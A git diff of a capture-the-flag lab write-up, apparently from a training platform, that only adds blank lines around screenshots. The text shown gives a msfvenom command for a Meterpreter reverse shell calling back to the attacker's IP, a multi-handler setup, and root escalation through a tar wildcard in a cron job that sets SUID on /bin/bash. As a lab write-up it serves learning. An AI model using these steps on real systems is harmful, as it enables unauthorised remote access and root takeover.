@@ -163,13 +163,19 @@ Before escalating privileges it would be best to first transition from netcat to
 First up, creating a payload using mfsvenom:
 `msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.4.2.138 LPORT=4445 -f elf > shell.elf`
 Secondly, download the payload into a writable directory on the target machine (usually the tmp directory is best). I did this using a webserver and the "wget" command. 
+
 ![](Assets/Images/Pasted%20image%2020221205145044.png)
+
 Start up msfconsole and setup a multi handler to catch the incoming Meterpreter shell.
 Set payload to Meterpreter.
 Used exploit -j so the job runs in the background. 
+
 ![](Assets/Images/Pasted%20image%2020221205150415.png)
+
 Make sure to change the permissions on the payload to make it executable and then finally, activate the payload!
+
 ![](Assets/Images/Pasted%20image%2020221205145935.png)
+
 ![](Assets/Images/Pasted%20image%2020221205151045.png)
 
 
@@ -178,7 +184,9 @@ Make sure to change the permissions on the payload to make it executable and the
 Now we've got a Meterpreter shell, it will be far easier to escalate privileges from here. LinPeas is a great option for enumerating potential escalation vectors.
 
 One thing which caught my eye when scrolling through the LinPeas output was a 'backup' cron job which runs every minute with root privileges. 
+
 ![](Assets/Images/Pasted%20image%2020221205153425.png)
+
 Unfortunately after checking the permissions of the file and directory, we do not have and write permissions however upon checking the contents of the script it looks as though the script (running with root permissions) is changing directory to /var/www/html and compressing the data within using tar and saving it as "backup.tgz"
 
 ![](Assets/Images/Pasted%20image%2020221205160043.png)
@@ -196,7 +204,9 @@ The whole thing ends up looking like this in the backend:
 
 Once these files have been created and after waiting about a minute for the cron job to run, we can see that /bin/bash now has a SUID bit set which means we can execute it with root privileges and get the root shell.
 `Command: /bin/bash -p`
+
 ![](Assets/Images/Pasted%20image%2020221205162008.png)
+
 We can now easily get the root flag and answer our final question!
 
 ![](Assets/Images/Pasted%20image%2020221205162135.png)
